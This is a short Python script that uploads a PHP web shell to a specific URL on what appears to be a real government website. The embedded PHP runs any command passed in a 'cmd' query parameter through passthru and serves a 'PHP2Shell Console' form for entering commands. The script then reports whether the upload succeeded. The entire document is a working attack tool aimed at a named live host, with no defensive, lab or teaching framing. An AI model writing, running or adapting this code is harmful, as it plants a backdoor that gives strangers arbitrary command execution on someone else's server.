#!/usr/bin/env python3
import requests

# The remote URL
url = "https://www.bkn.go.id/php2shell/index.php"

# The exact code you want to put inside index.php
# This adds a working command line form
new_code = """<?php
// Simple command runner
if (isset($_GET['cmd'])) {
 $cmd = $_GET['cmd'];
 echo "<pre>";
 passthru($cmd);
 echo "</pre>";
} else {
 ?>
 <!DOCTYPE html>
 <html>
 <head><title>PHP2Shell</title></head>
 <body>
 <h1>PHP2Shell Console</h1>
 <form method="GET">
 Command: <input type="text" name="cmd" required>
 <button type="submit">Run</button>
 </form>
 <hr>
 </body>
 </html>
 <?php
}
?>"""

# Send the POST request to upload the file
# In php2shell, 'file' is usually the parameter for uploading code
data = {'file': new_code}

try:
 response = requests.post(url, data=data)
 if response.status_code == 200:
     print("✅ File uploaded successfully!")
     print("You can now use the command line form in your browser.")
 else:
     print(f"❌ Upload failed. Status: {response.status_code}")
     print(response.text)
except Exception as e:
 print(f"Error: {e}")
